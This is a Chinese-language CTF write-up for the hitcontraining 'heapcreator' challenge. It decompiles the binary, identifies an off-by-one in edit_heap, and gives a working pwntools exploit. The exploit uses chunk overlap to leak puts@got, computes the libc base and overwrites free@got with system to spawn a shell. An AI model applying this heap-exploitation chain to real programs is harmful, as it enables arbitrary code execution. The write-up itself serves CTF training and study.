
# [原创]hitcontraining_heapcreator

参考

> <a href="elink@d2eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3S2W2j5i4m8Q4x3V1k6H3N6r3#2S2L8r3I4G2j5K6u0Q4x3V1k6U0K9s2g2F1K9#2)9J5k6r3g2^5N6r3g2F1k6q4)9J5k6r3!0$3k6i4u0D9j5i4m8H3K9h3&6Y4i4K6u0r3i4K6t1K6K9r3W2@1j5$3!0F1i4K6u0V1N6s2u0S2K9h3&6A6L8X3N6Q4x3X3c8D9j5h3t1I4x3H3`.`."><mark class="encrypted">84fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3S2W2j5i4m8Q4x3V1k6H3N6r3#2S2L8r3I4G2j5K6u0Q4x3V1k6U0K9s2g2F1K9#2)9J5k6r3g2^5N6r3g2F1k6q4)9J5k6r3!0$3k6i4u0D9j5i4m8H3K9h3&6Y4</mark></a>

---

# 看保护

Partial RELRO表明`got`表可写

![](upload/attach/202603/1002337_7W3VZVE6PXJQRJ2.png)

# 看ida

## main函数

可以看到是菜单题，有四个功能

```python
int menu()
{
puts("--------------------------------");
puts(" Heap Creator ");
puts("--------------------------------");
puts(" 1. Create a Heap ");
puts(" 2. Edit a Heap ");
puts(" 3. Show a Heap ");
puts(" 4. Delete a Heap ");
puts(" 5. Exit ");
puts("--------------------------------");
return printf("Your choice :");
}
```

```python
int __fastcall main(int argc, const char **argv, const char **envp)
{
char buf[8]; // [rsp+0h] [rbp-10h] BYREF
unsigned __int64 v5; // [rsp+8h] [rbp-8h]
v5 = __readfsqword(0x28u);
setvbuf(_bss_start, 0LL, 2, 0LL);
setvbuf(stdin, 0LL, 2, 0LL);
while ( 1 )
{
menu();
read(0, buf, 4uLL);
switch ( atoi(buf) )
{
case 1:
create_heap();
break;
case 2:
edit_heap();
break;
case 3:
show_heap();
break;
case 4:
delete_heap();
break;
case 5:
exit(0);
default:
puts("Invalid Choice");
break;
}
}
}
```

## create_heap函数

分析代码可以知道`heaparray`是一个全局变量，从0-9先判断该数组是否已填满（10个），未填满则申请0x10大小的内存地址（记为内存1）作为元素值，然后输入`size`，`size`作为该内存地址的前0x8字节的值，后0x8字节用来存放`malloc(size)`返回的内存地址（记为内存2），之后再用`read_input(*((_QWORD *)*(&heaparray + i) + 1), size);`往内存2写入东西，写入长度是`size`。没啥毛病

```python
unsigned __int64 create_heap()
{
__int64 v0; // rbx
int i; // [rsp+4h] [rbp-2Ch]
size_t size; // [rsp+8h] [rbp-28h]
char buf[8]; // [rsp+10h] [rbp-20h] BYREF
unsigned __int64 v5; // [rsp+18h] [rbp-18h]
v5 = __readfsqword(0x28u);
for ( i = 0; i <= 9; ++i )
{
if ( !*(&heaparray + i) )
{
*(&heaparray + i) = malloc(0x10uLL);
if ( !*(&heaparray + i) )
{
puts("Allocate Error");
exit(1);
}
printf("Size of Heap : ");
read(0, buf, 8uLL);
size = atoi(buf);
v0 = (__int64)*(&heaparray + i);
*(_QWORD *)(v0 + 8) = malloc(size);
if ( !*((_QWORD *)*(&heaparray + i) + 1) )
{
puts("Allocate Error");
exit(2);
}
*(_QWORD *)*(&heaparray + i) = size;
printf("Content of heap:");
read_input(*((_QWORD *)*(&heaparray + i) + 1), size);
puts("SuccessFul");
return __readfsqword(0x28u) ^ v5;
}
}
return __readfsqword(0x28u) ^ v5;
}
```

调用一次`create_heap`函数如下：

![](upload/attach/202603/1002337_7X7KERKNKFV942Q.png)

## edit_heap函数

指定`heaparray`的索引，修改内存2的内容，问题出在`read_input(*((void **)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);`这里，读入长度`(_QWORD *)*(&heaparray + v1) + 1LL`也就是`size+1`，会造成off-by-one溢出，我们可以溢出`size`的低字节，造成chunk extend和overlap

```python
unsigned __int64 edit_heap()
{
int v1; // [rsp+Ch] [rbp-14h]
char buf[8]; // [rsp+10h] [rbp-10h] BYREF
unsigned __int64 v3; // [rsp+18h] [rbp-8h]
v3 = __readfsqword(0x28u);
printf("Index :");
read(0, buf, 4uLL);
v1 = atoi(buf);
if ( (unsigned int)v1 >= 0xA )
{
puts("Out of bound!");
_exit(0);
}
if ( *(&heaparray + v1) )
{
printf("Content of heap : ");
read_input(*((void **)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);
puts("Done !");
}
else
{
puts("No such heap !");
}
return __readfsqword(0x28u) ^ v3;
}
```

## show_heap

就是打印`size`和内存2的内容

```python
unsigned __int64 show_heap()
{
int v1; // [rsp+Ch] [rbp-14h]
char buf[8]; // [rsp+10h] [rbp-10h] BYREF
unsigned __int64 v3; // [rsp+18h] [rbp-8h]
v3 = __readfsqword(0x28u);
printf("Index :");
read(0, buf, 4uLL);
v1 = atoi(buf);
if ( (unsigned int)v1 >= 0xA )
{
puts("Out of bound!");
_exit(0);
}
if ( *(&heaparray + v1) )
{
printf("Size : %ld\nContent : %s\n", *(_QWORD *)*(&heaparray + v1), *((const char **)*(&heaparray + v1) + 1));
puts("Done !");
}
else
{
puts("No such heap !");
}
return __readfsqword(0x28u) ^ v3;
}
```

## delete_heap

根据索引删除`heaparray`对应的内存1和内存2

```python
unsigned __int64 delete_heap()
{
int v1; // [rsp+Ch] [rbp-14h]
char buf[8]; // [rsp+10h] [rbp-10h] BYREF
unsigned __int64 v3; // [rsp+18h] [rbp-8h]
v3 = __readfsqword(0x28u);
printf("Index :");
read(0, buf, 4uLL);
v1 = atoi(buf);
if ( (unsigned int)v1 >= 0xA )
{
puts("Out of bound!");
_exit(0);
}
if ( *(&heaparray + v1) )
{
free(*((void **)*(&heaparray + v1) + 1));
free(*(&heaparray + v1));
*(&heaparray + v1) = 0LL;
puts("Done !");
}
else
{
puts("No such heap !");
}
return __readfsqword(0x28u) ^ v3;
}
```

# 思路

我们利用三次`create_heap`功能，得到`heaparray[0]`，`heaparray[1]`，`heaparray[2]`，利用`edit_heap`的off-by-one，我们可以修改`heaparray[1]`内存1的`size`字段，使得`heaparray[1]`的内存1可以覆盖`heaparray[2]`的内存1的内容，完成chunk extend和overlap，进而实现任意地址修改，劫持`got`表拿shell。

# 调试过程

```python
def create(size,payload):
io.recvuntil(b"Your choice :")
io.send(b'1')
io.recvuntil(b"Size of Heap : ")
io.sendline(str(size).encode())
io.recvuntil(b"Content of heap:")
io.sendline(payload)
def edit(index,payload):
io.recvuntil(b"Your choice :")
io.send(b'2')
io.recvuntil(b"Index :")
io.sendline(str(index).encode())
io.recvuntil(b"Content of heap : ")
io.send(payload)
def show(index):
io.recvuntil(b"Your choice :")
io.send(b'3')
io.recvuntil(b"Index :")
io.sendline(str(index).encode())
io.recvuntil(b"Content : ")
content = u64(io.recvuntil(b"\n",drop=True).ljust(0x8,b'\x00'))
return content
def delete(index):
io.recvuntil(b"Your choice :")
io.send(b'4')
io.recvuntil(b"Index :")
io.sendline(str(index).encode())
```

先写下程序交互

```python
create(0x18,b'aaa')# chunk1:0x20 chunk2:0x20
create(0x20,b'aaa')# chunk3:0x20 chunk4:0x30
create(0x20,b'aaa')# chunk5:0x20 chunk6:0x30
```

三次`create`申请了6个chunk，注意第一个`malloc(0x18)`会把`chunk3`的`pre_size`字段给`chunk2`用

![](upload/attach/202603/1002337_NNBA32TMDNAKG99.png)

`chunk1`的前8字节是记录的`size`为18，后8字节记录的是`chunk2`的数据部分地址。

![](upload/attach/202603/1002337_FD3JJA93UZZHT2A.png)

```python
edit(0,b'a'*0x18+p8(0x71))# off-by-one修改chunk3的size字段，使得chunk3的size从0x20变成0x70，使得chunk3能够覆盖chunk3，chunk4，chunk5的内容
```

可以看到成功把`chunk3`的`size`修改成0x71，`chunk3`覆盖了`chunk4`和`chunk5`

![](upload/attach/202603/1002337_MUXEASC3VG9NJXQ.png)

```python
delete(1)
```

![](upload/attach/202603/1002337_K5ADCXDMBPKANVQ.png)

```python
payload = b'a'*0x50 + p64(0x20) + p64(elf.got["puts"])# 把索引为2的heaparray的堆修改为puts@got
create(0x60,payload)
```

我们重新申请一个0x60大小的内存，并把`heaparray[2]`的内存1也就是`chunk5`的后8字节覆盖为`put@got`。也就是我们可以修改`heaparray[1]`的内存2内容，从而能够修改`heaparray[2]`的内存1的内容，注意内存1的后8字节是存放内存2地址的，而我们刚好可以利用`edit_heap`修改`heaparray[2]`的内存2的内容，不就能实现任意地址写了。而利用`show_heap`还能实现任意地址读。

![](upload/attach/202603/1002337_B3CXY8NA3G3XDSJ.png)

可以看到此时`heaparray[2]`的内存1的后8字节变成了0x602028，也就是`puts@got`地址，而我们还可以利用`show_heap`打印`heaparray[2]`内存2的内容，这里就是打印`puts@got`的内容，我们就可以泄露`libc`基址了。

![](upload/attach/202603/1002337_JUX3Y9Y2DEQQ34P.png)

![](upload/attach/202603/1002337_GSNP6GY8VTAR7SH.png)

```python
puts_addr = show(2)# 泄露puts@got内容
log.info(f"puts_addr -->{hex(puts_addr)}")
base = puts_addr - libc.symbols["puts"]
system = base + libc.symbols["system"]
payload = b'a'*0x50 + p64(0x20) + p64(elf.got["free"])# 把索引为2的heaparray的堆修改为free@got
edit(1,payload)
```

获取的地址和调试的一样

![](upload/attach/202603/1002337_WXDQZYKXDTMUNUV.png)

接着把`heaparray[2]`的内存1的后8字节变成了0x602018，也就是`free@got`地址

![](upload/attach/202603/1002337_PWSWP5H82H7AQ7P.png)

![](upload/attach/202603/1002337_99Y7V55FY6JNYFU.png)

```python
edit(2,p64(system))# 把free@got内容修改为system地址
edit(0,b'/bin/sh\x00')
delete(0)# free(heaparray[0]+1)变成了system(heaparray[0]+1)，也就是system("/bin/sh\x00")
io.interactive()
```

此时，我们修改`heaparray[2]`的内存2，其实就是修改`free@got`的内容，这里修改成`system`地址
